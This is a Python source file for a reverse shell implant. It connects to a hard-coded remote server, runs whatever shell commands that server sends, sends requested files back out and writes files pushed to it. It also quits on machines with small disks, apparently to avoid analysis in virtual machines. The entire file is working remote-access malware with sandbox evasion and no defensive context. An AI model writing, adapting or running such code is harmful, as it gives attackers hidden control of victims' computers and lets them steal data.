import socket
import os

host = "192.168.31.190" # Server IP
port = 1337 #Server port
buff_size = 4096
SEPARATOR = "|"

# For detected VM
if hasattr(os, "statvfs"):  # POSIX

    def total_storage(path):
        tmp = os.statvfs(path)
        storage = tmp.f_blocks * tmp.f_frsize
        return storage

elif os.name == "nt":  # NT
    import ctypes
    import sys

    def total_storage(path):
        _, total, free = (
            ctypes.c_ulonglong(),
            ctypes.c_ulonglong(),
            ctypes.c_ulonglong(),
        )
        if sys.version_info >= (3,) or isinstance(path, unicode):
            fun = ctypes.windll.kernel32.GetDiskFreeSpaceExW
        else:
            fun = ctypes.windll.kernel32.GetDiskFreeSpaceExA
        ret = fun(path, ctypes.byref(_), ctypes.byref(total), ctypes.byref(free))
        if ret == 0:
            raise ctypes.WinError()
        return total.value

else:
    raise NotImplementedError("platform not supported")


def VmDetected():
    gb = total_storage(os.getcwd()) // 1024 // 1024 // 1024
    if gb < 97:
        exit()


def RunShell(msg, sock):
    if msg.split()[0] == "cd":
        os.chdir(msg.split()[1])
        sock.send("OK".encode())
        return
    out = os.popen(msg).read()
    if out == "":
        sock.send("[*]no output".encode())
    else:
        out = out.encode()
        sent_bytes = 0
        while sent_bytes < len(out):
            sock.send(out[sent_bytes : sent_bytes + buff_size])
            sent_bytes += buff_size


def ReadFile(sock):
    filename = sock.recv(buff_size).decode()
    f = open(filename, "rb")
    while True:
        data = f.read(buff_size)
        if not data:
            break
        sock.send(data)
    f.close()


def SaveFile(sock):
    receive = sock.recv(buff_size).decode()
    filename, filesize = receive.split(SEPARATOR)
    filename = os.path.basename(filename)
    filesize = int(filesize)
    print(f"saving file {filename} ...")
    saved_bytes = 0
    f = open(filename, "wb")
    while True:
        if saved_bytes >= int(filesize):
            break

        data = sock.recv(buff_size)
        if not data:
            break

        saved_bytes += f.write(data)
    f.close()
    print("File saved!")


VmDetected()

sock = socket.socket()

sock.connect((host, port))

print(f"connected to {host}:{port} is succes!")

sock.send(os.name.encode())

while True:

    msg = sock.recv(buff_size).decode()
    if msg == "":
        continue
    elif msg == "exit":
        break
    elif msg == "ReadFile":
        sock.send("OK".encode())
        ReadFile(sock)
    elif msg == "SendFile":
        sock.send("OK".encode())
        SaveFile(sock)
    else:
        RunShell(msg, sock)

sock.close()
